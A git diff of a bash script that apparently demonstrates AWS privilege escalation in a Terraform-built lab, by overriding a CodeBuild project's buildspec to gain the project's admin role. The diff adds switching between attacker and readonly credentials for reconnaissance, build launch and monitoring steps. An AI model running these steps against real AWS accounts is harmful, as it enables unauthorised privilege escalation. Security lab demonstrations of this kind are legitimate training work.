@@ -66,6 +66,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -76,18 +85,29 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -102,15 +122,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -120,11 +142,12 @@ else
 fi
 echo ""
 
-# Step 5: Discover existing CodeBuild projects (optional reconnaissance)
+# [OBSERVATION] Step 5: Discover existing CodeBuild projects (reconnaissance)
 echo -e "${YELLOW}Step 5: Discovering existing CodeBuild projects${NC}"
+use_readonly_creds
 echo "Attempting to list CodeBuild projects..."
 
-show_cmd "Attacker" "aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text"
+show_cmd "ReadOnly" "aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text"
 PROJECTS=$(aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text 2>/dev/null || echo "")
 
 if [ -n "$PROJECTS" ]; then
@@ -132,16 +155,17 @@ if [ -n "$PROJECTS" ]; then
     echo "$PROJECTS" | tr '\t' '\n' | head -5
     echo -e "${GREEN}✓ Successfully listed projects${NC}"
 else
-    echo -e "${YELLOW}Could not list projects (codebuild:ListProjects not granted)${NC}"
+    echo -e "${YELLOW}Could not list projects (codebuild:ListProjects not granted to readonly user)${NC}"
     echo "But we know the target project exists: $TARGET_PROJECT"
 fi
 echo ""
 
-# Step 6: Get details about the target project (optional)
+# [OBSERVATION] Step 6: Get details about the target project
 echo -e "${YELLOW}Step 6: Getting target project details${NC}"
+use_readonly_creds
 echo "Target project: $TARGET_PROJECT"
 
-show_cmd "Attacker" "aws codebuild batch-get-projects --region $AWS_REGION --names \"$TARGET_PROJECT\" --query 'projects[0]' --output json"
+show_cmd "ReadOnly" "aws codebuild batch-get-projects --region $AWS_REGION --names \"$TARGET_PROJECT\" --query 'projects[0]' --output json"
 PROJECT_INFO=$(aws codebuild batch-get-projects \
     --region $AWS_REGION \
     --names "$TARGET_PROJECT" \
@@ -153,7 +177,7 @@ if [ -n "$PROJECT_INFO" ]; then
     echo "Project service role: $PROJECT_ROLE"
     echo -e "${GREEN}✓ Retrieved project details${NC}"
 else
-    echo -e "${YELLOW}Could not get project details (codebuild:BatchGetProjects not granted)${NC}"
+    echo -e "${YELLOW}Could not get project details (codebuild:BatchGetProjects not granted to readonly user)${NC}"
     echo "But we know it exists and has an admin role attached"
 fi
 echo ""
@@ -185,8 +209,9 @@ cat "$BUILDSPEC_FILE"
 echo ""
 echo -e "${GREEN}✓ Malicious buildspec prepared${NC}\n"
 
-# Step 8: Start build batch with buildspec override
+# [EXPLOIT] Step 8: Start build batch with buildspec override
 echo -e "${YELLOW}Step 8: Starting build batch with buildspec-override${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector - overriding the buildspec..."
 echo "Project: $TARGET_PROJECT"
 echo "The build will execute with the project's admin role permissions"
@@ -211,8 +236,9 @@ else
 fi
 echo ""
 
-# Step 9: Monitor build batch execution
+# [OBSERVATION] Step 9: Monitor build batch execution
 echo -e "${YELLOW}Step 9: Monitoring build batch execution${NC}"
+use_readonly_creds
 echo "Waiting for build batch to complete..."
 echo "This may take 2-3 minutes for batch build orchestration..."
 echo ""
@@ -223,7 +249,7 @@ MAX_WAIT=240  # 4 minutes for batch builds
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     # Get batch status
-    show_cmd "Attacker" "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
+    show_cmd "ReadOnly" "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
     BATCH_INFO=$(aws codebuild batch-get-build-batches \
         --region $AWS_REGION \
         --ids "$BUILD_BATCH_ID" \
@@ -268,11 +294,12 @@ echo "Waiting 15 seconds for IAM changes to propagate..."
 sleep 15
 echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 
-# Step 11: Verify admin access
+# [OBSERVATION] Step 11: Verify admin access
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
+use_readonly_creds
 echo "Attempting to list IAM users..."
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
